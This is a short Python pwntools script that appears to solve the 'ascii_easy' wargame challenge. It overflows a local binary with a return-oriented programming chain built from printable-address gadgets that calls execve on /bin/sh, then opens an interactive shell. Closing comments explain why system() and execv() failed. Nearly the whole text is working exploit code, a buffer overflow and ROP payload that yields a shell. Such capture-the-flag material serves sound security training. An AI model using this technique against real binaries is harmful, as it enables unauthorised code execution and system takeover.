from pwn import *

DUMMY = "AAAA"
BASE = 0x5555e000

NULL_ADDR = 0x55575852
EXECVE_ADDR = 0x5561676A        # @call execve in execv()
BINSH_ADDR_1 = 0x23377377
BINSH_ADDR_2 = 0x32344475
# BINSH_ADDR = BINSH_ADDR1 + BINSH_ADDR2 = 0x556bb7ec

GADGET_OFFSET_1 = 0x0001706c    # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
GADGET_OFFSET_2 = 0x0006812c    # add esi, ebx ; ret
GADGET_OFFSET_3 = 0x0001934e    # pop ebx ; ret
GADGET_OFFSET_4 = 0x000d904c    # pushal ; ret

payload = DUMMY * 8
payload += p32(BASE + GADGET_OFFSET_1) + p32(BINSH_ADDR_1) + p32(BINSH_ADDR_2) \
                + p32(EXECVE_ADDR) + p32(NULL_ADDR)
payload += p32(BASE + GADGET_OFFSET_2)
payload += p32(BASE + GADGET_OFFSET_3)  # <--- 5 pops means that NULL in stack was found.
payload += p32(BASE + GADGET_OFFSET_3)
payload += p32(BASE + GADGET_OFFSET_3)
payload += p32(BASE + GADGET_OFFSET_3)
payload += p32(BASE + GADGET_OFFSET_3)
payload += p32(BASE + GADGET_OFFSET_3)
payload += p32(BASE + GADGET_OFFSET_4)

p = process(['/home/ascii_easy/ascii_easy', payload])
print p.recv()
p.interactive()

'''
Not work at system()            --> CMPXCHG is checked because of lock variable in system()
Not work at execv(), execl()    --> EAX register has dummy, but referred.

I took a long time to get only 33 points... :(
'''
